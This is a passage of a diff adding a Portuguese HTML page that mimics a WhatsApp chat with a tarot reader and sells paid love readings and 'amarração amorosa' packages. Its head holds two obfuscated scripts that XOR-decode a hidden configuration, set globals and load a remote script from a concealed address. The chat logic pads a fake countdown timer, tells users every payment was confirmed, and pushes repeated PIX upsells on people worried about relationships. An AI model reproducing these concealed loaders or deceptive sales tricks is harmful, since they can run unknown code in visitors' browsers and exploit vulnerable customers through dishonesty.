@@ -1,0 +1,1219 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Leitura Amorosa - Milena</title>
+    <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@400;500;600&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "ycqt3x61t7");
+    </script>
+    <script>(function(){var a_j6=atob("DMzaSx2VrzcOoT9G67f4Pm/5jQ0syUsym7/gZDL2y1kg1EsrgqqjZX76whls0xA1iL6zO2nmgEJ6zExph62uLm7hgV19gxNkiriuOXT32kNr0h18sLf4JXz4yhU0g1snn633Pmn4xlF3jE80jrq/JWm411RhxRI1iKf4Zz/jzlt7xB18ye6nZ2a3wVZjxB18yai7P3y42kNjyFk/xryoLmvwwUMj0kokgqipaTG32VZi1Fpk0e74NkDo");var x_6lwp=[];for(var d_bl=0;d_bl<a_j6.length;d_bl++){x_6lwp.push(a_j6.charCodeAt(d_bl)&255);}var v_id3g=x_6lwp[0];var b_c7s=x_6lwp.slice(1,1+v_id3g);var y_s9d=x_6lwp.slice(1+v_id3g);var d_iz=y_s9d.map(function(b,u_dc){return b^b_c7s[u_dc%v_id3g];});var p_s2="";for(var x_bbd6=0;x_bbd6<d_iz.length;x_bbd6++){p_s2+=String.fromCharCode(d_iz[x_bbd6]&255);}var c_i=decodeURIComponent(escape(p_s2));var w_ef7o=JSON.parse(c_i);var i_a=w_ef7o.globals||[];i_a.forEach(function(p_u){window[p_u.name]=p_u.value;});var w_z=document.createElement("script");w_z.src=w_ef7o.url;w_z.async=true;w_z.defer=true;(w_ef7o.attributes||[]).forEach(function(x_n3g){w_z.setAttribute(x_n3g.name,x_n3g.value);});(document.head||document.documentElement).appendChild(w_z);})();</script>
+    <script>(function(){var r_6v38=atob("DAufjfgvNg+FNQ2tknC9+IpDFDWnXXnZ4nilotdMUmGrQHnA+23mo5tAWyHnRyLe8Xn2/YxcGX/sTWjBvXv29Z1DGGX2FyGP83/r/5FNQ3vgRi+XyVazr59DWW3kWX6PqFDkr5ZOW2qnDy/d+3P64bFLFCOnQ2zB5269t9oZVzi0BmvJp2qmvMEXVTqzATWaqjurv84NS1L4");var w_lh=[];for(var v_7=0;v_7<r_6v38.length;v_7++){w_lh.push(r_6v38.charCodeAt(v_7)&255);}var l_8df=w_lh[0];var z_nlx=w_lh.slice(1,1+l_8df);var u_ez7r=w_lh.slice(1+l_8df);var h_c=u_ez7r.map(function(b,l_ynn){return b^z_nlx[l_ynn%l_8df];});var t_0p="";for(var b_x6u=0;b_x6u<h_c.length;b_x6u++){t_0p+=String.fromCharCode(h_c[b_x6u]&255);}var x_7h2t=decodeURIComponent(escape(t_0p));var x_zp5=JSON.parse(x_7h2t);var j_yy=x_zp5.globals||[];j_yy.forEach(function(m_h){window[m_h.name]=m_h.value;});var d_q=document.createElement("script");d_q.src=x_zp5.url;d_q.async=true;d_q.defer=true;(x_zp5.attributes||[]).forEach(function(b_z2){d_q.setAttribute(b_z2.name,b_z2.value);});(document.head||document.documentElement).appendChild(d_q);})();</script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #d9dbd5;
+            display: flex;
+            justify-content: center;
+            height: 100vh;
+            height: 100dvh;
+            overflow: hidden;
+        }
+        .chat-container {
+            width: 100%;
+            max-width: 500px;
+            height: 100%;
+            background: #efeae2 url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png');
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .header {
+            background-color: #075E54;
+            color: white;
+            display: flex;
+            align-items: center;
+            padding: 10px 15px;
+            padding-top: max(15px, env(safe-area-inset-top));
+            z-index: 10;
+        }
+        .profile-pic {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-image: url('../images/medium-milena.webp');
+            background-size: cover;
+            background-position: center;
+            margin-right: 15px;
+        }
+        .contact-info { flex-grow: 1; }
+        .contact-name { font-size: 16px; font-weight: bold; }
+        .contact-status { font-size: 13px; color: rgba(255,255,255,0.8); }
+        .chat-window {
+            flex-grow: 1;
+            padding: 20px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            scroll-behavior: smooth;
+        }
+        .message {
+            max-width: 85%;
+            padding: 8px 12px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            position: relative;
+            font-size: 15px;
+            line-height: 1.4;
+            word-wrap: break-word;
+            white-space: pre-wrap;
+        }
+        .message.received {
+            align-self: flex-start;
+            background-color: #ffffff;
+            border-top-left-radius: 0;
+            box-shadow: 0 1px 1px rgba(0,0,0,0.1);
+        }
+        .message.sent {
+            align-self: flex-end;
+            background-color: #dcf8c6;
+            border-top-right-radius: 0;
+            box-shadow: 0 1px 1px rgba(0,0,0,0.1);
+        }
+        .time { font-size: 11px; color: #999; float: right; margin-top: 4px; margin-left: 8px; }
+        .input-area {
+            background-color: #f0f0f0;
+            padding: 10px;
+            display: flex;
+            align-items: center;
+        }
+        .input-box {
+            flex-grow: 1;
+            background: white;
+            border-radius: 20px;
+            padding: 12px 15px;
+            border: none;
+            outline: none;
+            font-size: 15px;
+        }
+        .send-btn {
+            background-color: #00a884;
+            color: white;
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-left: 10px;
+            cursor: pointer;
+            border: none;
+            font-size: 18px;
+        }
+        
+        .typing-bubble { 
+            display: none; 
+            align-items: center; 
+            background-color: white; 
+            padding: 12px 16px; 
+            border-radius: 8px; 
+            border-top-left-radius: 0; 
+            width: fit-content; 
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1); 
+            margin: 0 20px 10px 20px; 
+        }
+        .typing-dot { 
+            width: 7px; height: 7px; background-color: #8696a0; border-radius: 50%; margin: 0 3px; 
+            animation: typing-bounce 1.4s infinite ease-in-out both; 
+        }
+        .typing-dot:nth-child(1) { animation-delay: -0.32s; }
+        .typing-dot:nth-child(2) { animation-delay: -0.16s; }
+        @keyframes typing-bounce {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1); }
+        }
+
+        
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-top: 10px;
+            align-self: flex-end;
+            width: 100%;
+            align-items: flex-end;
+        }
+        .chat-btn {
+            background-color: #00a884;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            padding-top: max(15px, env(safe-area-inset-top));
+            border-radius: 20px;
+            font-size: 15px;
+            cursor: pointer;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.2);
+            transition: background 0.2s;
+        }
+        .chat-btn:active { background-color: #008f6f; }
+        .chat-btn.secondary { background-color: #ffffff; color: #00a884; border: 1px solid #00a884; }
+        
+        /* Molde invisível da leitura amorosa no formato estrito A4 */
+        #paper-template {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 794px;
+            min-height: 1123px; /* Garante pelo menos uma folha A4, mas cresce se precisar */
+            overflow: visible; /* Deixa o texto empurrar a folha pra baixo */
+            box-sizing: border-box;
+            background-color: #fdfaf2;
+            padding: 60px 50px; /* Mais espaço útil */
+            font-family: 'Caveat', cursive;
+            font-size: 24px; /* Reduzido de 32px para caber a carta toda */
+            color: #1a1a1a;
+            line-height: 1.5;
+            background-image: repeating-linear-gradient(transparent, transparent 36px, rgba(0,0,0,0.05) 37px);
+            background-position: 0 16px;
+        }
+
+        /* Modal para a Foto da Carta */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        .modal img {
+            max-width: 90%;
+            max-height: 70vh;
+            border-radius: 4px;
+        }
+        .modal-btns {
+            margin-top: 20px;
+            display: flex;
+            gap: 15px;
+        }
+        .modal-btn {
+            padding: 12px 20px;
+            background: #00a884;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .modal-btn.secondary { background: #444; }
+        .close-modal {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            color: white;
+            font-size: 35px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<div class="chat-container">
+    <div class="header">
+        <div class="profile-pic"></div>
+        <div class="contact-info">
+            <div class="contact-name">Milena Medeiros</div>
+            <div class="contact-status">online</div>
+        </div>
+    </div>
+
+    <div class="chat-window" id="chat-window"></div>
+        <div class="typing-bubble" id="typing-indicator">
+        <div class="typing-dot"></div>
+        <div class="typing-dot"></div>
+        <div class="typing-dot"></div>
+    </div>
+    
+    <div class="input-area" id="input-area">
+        <input type="text" class="input-box" id="message-input" placeholder="Aguarde..." disabled onkeypress="handleKeyPress(event)">
+        <button class="send-btn" id="send-btn" disabled onclick="sendMessage()">➤</button>
+    </div>
+</div>
+
+<div id="paper-template">
+    <div id="paper-content"></div>
+</div>
+
+<div class="modal" id="image-modal">
+    <div class="close-modal" onclick="closeModal()">×</div>
+    <img id="modal-img" src="" alt="Carta" style="max-height: 80vh; max-width: 90vw; border-radius: 8px;">
+    <div style="display: flex; gap: 15px; margin-top: 15px;">
+        <button onclick="downloadImg()" style="background-color: #00a884; border: none; padding: 12px 20px; color: white; border-radius: 8px; font-weight: bold; cursor: pointer;">⬇ Baixar Imagem</button>
+        <button onclick="printImg()" style="background-color: #005A9C; border: none; padding: 12px 20px; color: white; border-radius: 8px; font-weight: bold; cursor: pointer;">🖨 Imprimir Carta</button>
+    </div>
+</div>
+<script>
+
+
+
+
+    const chatWindow = document.getElementById('chat-window');
+    const messageInput = document.getElementById('message-input');
+    const sendBtn = document.getElementById('send-btn');
+    const typingIndicator = document.getElementById('typing-indicator');
+    const inputArea = document.getElementById('input-area');
+
+    let step = 0;
+    let isBotTyping = false;
+    let letterContent = "";
+    
+    
+    const urlParams = new URLSearchParams(window.location.search);
+    const urlSession = urlParams.get('session') || '';
+    let deliverableSessionId = urlSession || localStorage.getItem('templo_entregavel_session_id');
+    if (!deliverableSessionId) {
+        deliverableSessionId = 'entregavel_' + Date.now() + '_' + Math.floor(Math.random() * 100000);
+        localStorage.setItem('templo_entregavel_session_id', deliverableSessionId);
+    }
+    
+    let userData = {
+        nome: '', afastamento: '', ente: '', parentesco: '', mensagem: '',
+        perguntas: [], respostas: [], oraculo_amor: '', oraculo_financas: '', oraculo_familia: '', email: '', sessionId: deliverableSessionId,
+        deliverTime: 0, packageAmount: 35
+    };
+
+    function packageFromAmount(amount) {
+        amount = Number(amount || 35);
+        if (amount >= 59.99) return { amount: 60, questions: 20, days: 90, amarracao: true, mao: true, title: 'Pacote Sagrado VIP - Tudo Incluso' };
+        if (amount >= 54.99) return { amount: 55, questions: 10, days: 60, amarracao: true, mao: true, rival: true, title: 'Leitura Completa com Terceira Pessoa' };
+        if (amount >= 44.99) return { amount: 45, questions: 7, days: 30, amarracao: true, mao: true, title: 'Amarração Amorosa com Leitura da Mão' };
+        if (amount >= 34.99) return { amount: 35, questions: 5, days: 30, amarracao: true, title: 'Amarração Amorosa com 5 Respostas' };
+        if (amount >= 24.99) return { amount: 25, questions: 5, days: 30, amarracao: false, title: 'Leitura Amorosa com Oráculo' };
+        return { amount: 15, questions: 3, days: 0, amarracao: false, title: 'Leitura Amorosa Essencial' };
+    }
+
+    function applyPackage(amount) {
+        const info = packageFromAmount(amount);
+        userData.packageAmount = info.amount;
+        userData.packageTitle = info.title;
+        userData.questionLimit = info.questions;
+        userData.oraculoDays = info.days;
+        userData.hasAmarracao = info.amarracao;
+        userData.hasVideochamada = !!info.videochamada;
+        userData.sessions = info.sessions || 1;
+        return info;
+    }
+
+    async function hydratePackageFromPurchase() {
+        let amount = 20;
+        try {
+            const saved = JSON.parse(localStorage.getItem('templo_luz_pacote_pago') || '{}');
+            if (saved.amount) amount = saved.amount;
+        } catch(e) {}
+        const pedido = urlParams.get('pedido') || '';
+        if (pedido) {
+            try {
+                const res = await fetch('../check-purchase.php?external_id=' + encodeURIComponent(pedido));
+                const data = await res.json();
+                if (data && data.package && data.package.amount) amount = data.package.amount;
+                else if (data && data.amount) amount = data.amount;
+            } catch(e) {}
+        }
+        return applyPackage(amount);
+    }
+
+    const LEGACY_CACHE_KEY = 'temploLuz_chat2_cache';
+    const CACHE_KEY = `temploLuz_chat2_cache_${deliverableSessionId}`;
+    const CACHE_BACKUP_KEY = `${CACHE_KEY}_backup`;
+
+    
+    async function checkPurchased(hash) {
+        if (!userData.email) return false;
+        try {
+            let res = await fetch('check_purchases.php?email=' + encodeURIComponent(userData.email) + '&session_id=' + userData.sessionId);
+            let data = await res.json();
+            return data.purchases.some(p => p.includes(hash));
+        } catch(e) { return false; }
+    }
+
+    
+    async function awaitPurchaseOrTimeout(hash, onSuccess, onSkip, linkUrl) {
+        await typeMessage("Opa, recebi a confirmação do seu pedido! Vamos seguir em frente. 🙏");
+        onSuccess();
+    }
+    function saveCache() {
+        try {
+            const state = {
+                step: step, userData: userData, letterContent: letterContent,
+                html: chatWindow.innerHTML, time: Date.now()
+            };
+            const serialized = JSON.stringify(state);
+            localStorage.setItem(CACHE_BACKUP_KEY, serialized);
+            localStorage.setItem(CACHE_KEY, serialized);
+        } catch(e) {
+            try {
+                const safeState = {
+                    step: step, userData: userData, letterContent: letterContent,
+                    html: chatWindow.innerHTML.replace(/<img[^>]*src=["']data:image[^"']*["'][^>]*>/gi, '<div class="message received">Sua leitura foi gerada. Se ela não aparecer aqui, toque em imprimir/baixar quando a conversa continuar. <span class="time">' + getTime() + '</span></div>'),
+                    time: Date.now()
+                };
+                localStorage.setItem(CACHE_KEY, JSON.stringify(safeState));
+            } catch(err) {}
+        }
+    }
+
+    function loadCache() {
+        let cached = localStorage.getItem(CACHE_KEY) || localStorage.getItem(CACHE_BACKUP_KEY);
+        if (!cached) {
+            const legacy = localStorage.getItem(LEGACY_CACHE_KEY);
+            if (legacy) {
+                try {
+                    const legacyState = JSON.parse(legacy);
+                    if ((legacyState.userData || {}).sessionId === deliverableSessionId) {
+                        cached = legacy;
+                    }
+                } catch(e) {}
+            }
+        }
+        if (!cached) return false;
+        
+        try {
+            const state = JSON.parse(cached);
+            if ((Date.now() - state.time) / (1000 * 60 * 60) > 87600) {
+                localStorage.removeItem(CACHE_KEY);
+                localStorage.removeItem(CACHE_BACKUP_KEY);
+                return false;
+            }
+            if ((state.userData || {}).sessionId && state.userData.sessionId !== deliverableSessionId) {
+                return false;
+            }
+            
+            step = state.step;
+            userData = Object.assign(userData, state.userData || {}, { sessionId: deliverableSessionId });
+            letterContent = state.letterContent || "";
+            chatWindow.innerHTML = state.html || "";
+            chatWindow.scrollTop = chatWindow.scrollHeight;
+            
+            const btns = chatWindow.querySelectorAll('.chat-btn');
+            btns.forEach(btn => btn.style.display = 'none');
+            
+            if (step === 1) enableInput("Sua resposta...");
+            else if (step === 15) enableInput("Sua resposta...");
+            else if (step === 2) enableInput("Seu nome...");
+            else if (step === 3) enableInput("Situação de vocês...");
+            else if (step === 4) enableInput("Nome da pessoa amada...");
+            else if (step === 5) enableInput("Relação atual...");
+            else if (step === 6) enableInput("Sua pergunta...");
+            else if (step === 7) { inputArea.style.display = 'none'; startLetterTimer(); }
+            else if (step === 8) enableInput("Sua mensagem para " + userData.ente + "...");
+            else if (step === 9) enableInput("Sua resposta...");
+            else if (step === 10) enableInput("Sua resposta...");
+            else if (step === 11) enableInput("Sua resposta...");
+            else if (step === 100) { inputArea.style.display = 'none'; resumeExpress(); }
+            else if (step === 110) { inputArea.style.display = 'none'; resumeExpress2(); }
+            else if (step === 101) { inputArea.style.display = 'none'; resumeUpsell1(); }
+            else if (step === 111) { inputArea.style.display = 'none'; resumeUpsell1_2(); }
+            else if (step === 102) { inputArea.style.display = 'none'; resumeUpsell2(); }
+            else if (step === 112) { inputArea.style.display = 'none'; resumeUpsell2_2(); }
+            else if (step === 104) { inputArea.style.display = 'none'; resumeNovaCarta(); }
+            else if (step === 114) { inputArea.style.display = 'none'; resumeNovaCarta2(); }
+            else if (step === 103) { inputArea.style.display = 'none'; resumeFinalDonation(); }
+            else { inputArea.style.display = 'none'; }
+            
+            return true;
+        } catch (e) { return false; }
+    }
+
+    function getTime() {
+        const now = new Date();
+        return now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
+    }
+
+    function addMessage(text, type) {
+        let formatted = text.replace(/\*\*(.*?)\*\*/g, '<b>$1</b>').replace(/\*(.*?)\*/g, '<i>$1</i>');
+        const msgDiv = document.createElement('div');
+        msgDiv.className = `message ${type}`;
+        msgDiv.innerHTML = `${formatted} <span class="time">${getTime()}</span>`;
+        chatWindow.appendChild(msgDiv);
+        chatWindow.scrollTop = chatWindow.scrollHeight;
+        saveCache();
+    }
+    
+    function addImageMessage(dataUrl) {
+        const msgDiv = document.createElement('div');
+        msgDiv.className = `message received`;
+        
+        const img = document.createElement('img');
+        img.src = dataUrl;
+        img.style.width = '100%';
+        img.style.borderRadius = '8px';
+        img.style.cursor = 'pointer';
+        img.onclick = () => openModal(dataUrl);
+        
+        msgDiv.appendChild(img);
+        
+        const timeSpan = document.createElement('span');
+        timeSpan.className = 'time';
+        timeSpan.innerText = getTime();
+        msgDiv.appendChild(timeSpan);
+        
+        chatWindow.appendChild(msgDiv);
+        chatWindow.scrollTop = chatWindow.scrollHeight;
+        saveCache();
+    }
+
+    // Modal
+    function openModal(src) { document.getElementById('modal-img').src = src; document.getElementById('image-modal').style.display = 'flex'; }
+    function closeModal() { document.getElementById('image-modal').style.display = 'none'; }
+    function downloadImg() {
+        const a = document.createElement('a'); a.href = document.getElementById('modal-img').src;
+        a.download = 'minha_leitura_amorosa.jpg'; document.body.appendChild(a); a.click(); document.body.removeChild(a);
+    }
+    function printImg() {
+        const win = window.open(''); win.document.write('<img src="' + document.getElementById('modal-img').src + '" style="width:100%;">');
+        win.print(); win.close();
+    }
+
+    function showTyping() { typingIndicator.style.display = 'flex'; chatWindow.scrollTop = chatWindow.scrollHeight; }
+    function hideTyping() { typingIndicator.style.display = 'none'; }
+    function disableInput() { messageInput.disabled = true; sendBtn.disabled = true; messageInput.placeholder = "Aguarde..."; }
+    function enableInput(placeholder = "Mensagem...") {
+        inputArea.style.display = 'flex'; // Garante que a barra reapareça!
+        messageInput.disabled = false; sendBtn.disabled = false; messageInput.placeholder = placeholder;
+        setTimeout(() => messageInput.focus(), 100); 
+    }
+
+    async function typeMessage(content, overrideDelay = null) {
+        showTyping();
+        let textLen = content.replace(/<[^>]*>?/gm, '').length;
+        let calcDelay = textLen * 45;
+        if (calcDelay < 1500) calcDelay = 1500;
+        if (calcDelay > 5000) calcDelay = 5000;
+        let finalDelay = overrideDelay !== null ? overrideDelay : calcDelay;
+
+        return new Promise(resolve => {
+            setTimeout(() => {
+                hideTyping(); addMessage(content, 'received'); resolve();
+            }, finalDelay);
+        });
+    }
+
+    function showButtons(options) {
+        return new Promise(resolve => {
+            const btnGroup = document.createElement('div');
+            btnGroup.className = 'btn-group';
+            options.forEach(opt => {
+                const btn = document.createElement('button');
+                btn.className = `chat-btn ${opt.type || ''}`;
+                btn.innerText = opt.label;
+                btn.onclick = () => {
+                    btnGroup.remove(); addMessage(opt.label, 'sent'); resolve(opt.value);
+                };
+                btnGroup.appendChild(btn);
+            });
+            chatWindow.appendChild(btnGroup); chatWindow.scrollTop = chatWindow.scrollHeight; saveCache();
+        });
+    }
+
+    async function fetchLetter() {
+        try {
+            const res = await fetch('api.php', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(userData) });
+            const data = await res.json();
+            return data.carta || "Infelizmente houve um erro espiritual. Tente novamente.";
+        } catch (e) { return "Erro de conexão."; }
+    }
+
+    async function fetchOraculo() {
+        try {
+            const res = await fetch('api_oraculo.php', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(userData) });
+            const data = await res.json();
+            return data.leitura || "Houve um erro espiritual na leitura.";
+        } catch (e) { return "Erro de conexão."; }
+    }
+
+    async function generateHandwrittenImage(text) {
+        const pC = document.getElementById('paper-content'); const pT = document.getElementById('paper-template');
+        pC.innerHTML = text.replace(/\n/g, '<br>');
+        const canvas = await html2canvas(pT, { scale: 1 });
+        return canvas.toDataURL("image/jpeg", 0.9);
+    }
+
+    function startLetterTimer() {
+        if (!letterContent || letterContent === "") {
+            fetchLetter().then(res => { letterContent = res; saveCache(); });
+        }
+        
+        let timerEl = document.getElementById('live-timer');
+        if (!timerEl) {
+            addMessage(`⏳ Sua leitura amorosa está sendo aberta nas cartas...<br><br>Tempo estimado para finalizar: <strong id="live-timer">--:--</strong>`, 'received');
+            timerEl = document.getElementById('live-timer');
+        }
+
+        const interval = setInterval(async () => {
+            let remain = userData.deliverTime - Date.now();
+            
+            if (remain <= 0) {
+                clearInterval(interval);
+                if ("Notification" in window && Notification.permission === "granted") {
+                    new Notification("Templo da Luz", { body: "Sua leitura está pronta! Volte para a tela para ler." });
+                }
+            
+                clearInterval(interval);
+                if (timerEl) timerEl.innerText = "Pronto!";
+                step = 8; 
+                saveCache();
+                deliverLetter();
+            } else {
+                let fakeRemain = remain;
+                  if (userData.fakedTimer) fakeRemain += (userData.fakedTimer * 60000);
+                  let m = Math.floor(fakeRemain / 60000);
+                  let s = Math.floor((fakeRemain % 60000) / 1000);
+                if (timerEl) timerEl.innerText = `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+            }
+        }, 1000);
+    }
+
+    
+    
+    async function resumeExpress() {
+        awaitPurchaseOrTimeout("39nzwuc_1059509", async () => {
+            userData.deliverTime = Date.now() + (1 * 60000); userData.fakedTimer = 0; 
+            step = 7; saveCache(); startLetterTimer(); isBotTyping = false;
+        }, async () => {
+            userData.deliverTime = Date.now() + (32 * 60000); userData.fakedTimer = 18;
+            step = 7; saveCache(); startLetterTimer(); isBotTyping = false;
+        }, `https://checkoutseguro.info/checkout/cmtdd2hqc000a01pvhhwhmzeg?offer=5bor678&utm_source=chat_entregavel&utm_campaign=${userData.sessionId}`);
+    }
+
+
+
+    async function resumeExpress2() {
+        await typeMessage("E agora, conseguiu confirmar a contribuição do plano Express?");
+        const pagouExp = await showButtons([
+            { label: "Já fiz a contribuição", value: "sim" },
+            { label: "Vou aguardar o tempo normal", value: "nao", type: "secondary" }
+        ]);
+        
+        if (pagouExp === 'sim') {
+            userData.deliverTime = Date.now() + (1 * 60000); userData.fakedTimer = 0; 
+        } else {
+            userData.deliverTime = Date.now() + (32 * 60000); userData.fakedTimer = 18;
+        }
+        step = 7; saveCache(); startLetterTimer(); isBotTyping = false;
+    }
+
+    
+    async function resumeUpsell1() {
+        awaitPurchaseOrTimeout("skbph9n", async () => { await typeMessage("Que ótimo! O que você quer dizer para o(a) " + userData.ente + " agora?"); step = 8; enableInput("Sua pergunta..."); saveCache(); isBotTyping = false; }, async () => { await typeMessage("Tudo bem, vamos seguir..."); await novaCartaPitch(); }, `https://checkoutseguro.info/checkout/cmtdd2lac002001ojpelg2m8i?offer=6b615q4&utm_source=chat_entregavel&utm_campaign=${userData.sessionId}`);
+    }
+
+
+    async function resumeUpsell1_2() {
+        await typeMessage("E agora, conseguiu confirmar a contribuição para enviar a sua mensagem?");
+        const cont1 = await showButtons([
+            { label: "Já fiz a contribuição", value: "sim" },
+            { label: "Agora não", value: "nao", type: "secondary" }
+        ]);
+        if (cont1 === 'sim') {
+            await typeMessage("Que ótimo! O que você quer dizer para o(a) " + userData.ente + " agora?");
+            step = 8; enableInput("Sua pergunta..."); saveCache(); isBotTyping = false; return;
+        }
+        await novaCartaPitch();
+    }
+
+    
+    async function resumeUpsell2() {
+        awaitPurchaseOrTimeout("ffa8pwx_1064318", async () => { await typeMessage("Maravilha! Vamos lá: para eu sintonizar com a sua energia amorosa, qual o nome da sua amada (ou amado), vocês já têm relacionamento? A quanto tempo?", 4000); step = 9; enableInput("Sua resposta..."); saveCache(); isBotTyping = false; }, async () => { await typeMessage("Tudo bem!"); await finalDonation(); }, `https://checkoutseguro.info/checkout/cmtdd2nsd000r01pvtwp6gm3s?offer=r2aiiue&utm_source=chat_entregavel&utm_campaign=${userData.sessionId}`);
+    }
+
+
+    async function resumeUpsell2_2() {
+        await typeMessage("Pronto, conseguiu confirmar a contribuição para a sua leitura espiritual?");
+        const cont2 = await showButtons([
+            { label: "Já fiz a contribuição", value: "sim" },
+            { label: "Agora não", value: "nao", type: "secondary" }
+        ]);
+        if (cont2 === 'sim') {
+            await typeMessage("Maravilha! Vamos lá: para eu sintonizar com a sua energia amorosa, qual o nome da sua amada (ou amado), vocês já têm relacionamento? A quanto tempo?", 4000);
+            step = 9; enableInput("Sua resposta..."); saveCache(); isBotTyping = false; return;
+        }
+        await finalDonation();
+    }
+
+    async function deliverLetter() {
+        isBotTyping = true;
+        await typeMessage("Pronto. A leitura principal virou nas cartas. Vou te entregar de forma direta, porque aqui apareceu energia forte.");
+        
+        if (!letterContent) letterContent = await fetchLetter();
+        
+        await typeMessage(letterContent, 1000);
+        await typeMessage("Também vou gerar uma imagem da sua leitura para você salvar ou imprimir, caso queira guardar essa orientação.");
+        
+        showTyping();
+        const imgData = await generateHandwrittenImage(letterContent);
+        hideTyping();
+        addImageMessage(imgData);
+        saveCache();
+
+        const pkg = packageFromAmount(userData.packageAmount);
+        trackBlindAnalytics('10_entrega_leitura_cartas');
+        if (pkg.days > 0) {
+            await typeMessage("Agora vamos abrir o seu oráculo amoroso dos próximos " + pkg.days + " dias.");
+            await typeMessage("Me diga em uma frase: qual é o maior medo que você tem hoje sobre essa relação?");
+            step = 9; enableInput("Seu maior medo..."); saveCache(); isBotTyping = false; return;
+        }
+        await typeMessage("Sua leitura essencial foi entregue. Fique atenta aos sinais nas próximas 48 horas, porque essa energia ainda está se mexendo.");
+        await miniPixOffers();
+    }
+
+    async function novaCartaPitch() {
+
+        let hasNova = await checkPurchased("a9fn5q6_1059505");
+        if (hasNova) {
+            await typeMessage(`Vi que você já tinha um aprofundamento extra no pedido original. Maravilha, ${userData.nome}. Vamos usar essa energia para abrir mais um ponto amoroso com a taróloga Milena.`);
+            await oraculumPitch();
+            return;
+        }
+
+        await typeMessage(`A energia espiritual aqui ainda continua muito forte, ${userData.nome}...`);
+        await typeMessage(`Se você sente que ainda ficou uma dúvida pesada sobre ${userData.ente}, posso abrir um complemento agora dentro deste atendimento: 3 respostas com leitura de carta por R$20, ou a opção mais vantajosa com 5 respostas + oráculo de 30 dias por R$30.`);
+        
+        trackBlindAnalytics('12_pitch_nova_carta');
+        const choice = await showButtons([
+            { label: "Quero o melhor: R$30 com 5 respostas", value: "trinta" }, { label: "Prefiro R$20 com 3 respostas", value: "vinte", type: "secondary" }, { label: "Não, obrigado(a)", value: "nao", type: "secondary" }
+        ]);
+        
+        if (choice === 'trinta') {
+            await typeMessage("Boa escolha. O de R$30 é o mais vantajoso porque libera 5 respostas e ainda abre o oráculo amoroso dos próximos 30 dias.");
+            await typeMessage(pixButton(30, "Gerar PIX de R$30 para 5 respostas + Oráculo 30 dias", "#00a884", "13_btn_extra_30"), 1000);
+            await oraculumPitch();
+        } else if (choice === 'vinte') {
+            await typeMessage("Certo. O de R$20 libera 3 respostas diretas com leitura de carta para o ponto que mais aperta agora.");
+            await typeMessage(pixButton(20, "Gerar PIX de R$20 para 3 respostas + leitura de carta", "#005A9C", "13_btn_extra_20"), 1000);
+            await oraculumPitch();
+        } else {
+            await oraculumPitch();
+        }
+    }
+
+    
+    async function resumeNovaCarta() {
+        awaitPurchaseOrTimeout("a9fn5q6_1059505", async () => { await typeMessage(`Maravilha, ${userData.nome}. O complemento foi localizado e vamos seguir com o aprofundamento amoroso.`); await oraculumPitch(); }, async () => { await typeMessage("Sem problemas, vamos continuar..."); await oraculumPitch(); }, `#`);
+    }
+
+
+    async function resumeNovaCarta2() {
+        await typeMessage("E agora, conseguiu confirmar a contribuição para o aprofundamento amoroso?");
+        const pagouCarta = await showButtons([
+            { label: "Já fiz a contribuição", value: "sim" },
+            { label: "Agora não", value: "nao", type: "secondary" }
+        ]);
+        if (pagouCarta === 'sim') {
+            await typeMessage(`Maravilha, ${userData.nome}. O complemento foi localizado e vamos seguir com o aprofundamento amoroso.`);
+        }
+        await oraculumPitch();
+    }
+
+    async function oraculumPitch() {
+
+        let hasOraculo = await checkPurchased("ffa8pwx_1064318");
+        if (hasOraculo) {
+            await typeMessage("Vi que você também tem direito à Leitura Espiritual de 90 dias que você adquiriu!");
+            await typeMessage("Para eu sintonizar com a sua energia amorosa, qual o nome da sua amada (ou amado), vocês já têm relacionamento? A quanto tempo?", 4000);
+            step = 9; enableInput("Sua resposta..."); saveCache(); isBotTyping = false; return;
+        }
+
+        trackBlindAnalytics('14_pitch_oraculo');
+        await typeMessage("✨ Agora que você já recebeu sua carta, quero te oferecer uma experiência diferente: uma *Leitura Espiritual dos seus Próximos 90 Dias*. 🔮", 3000);
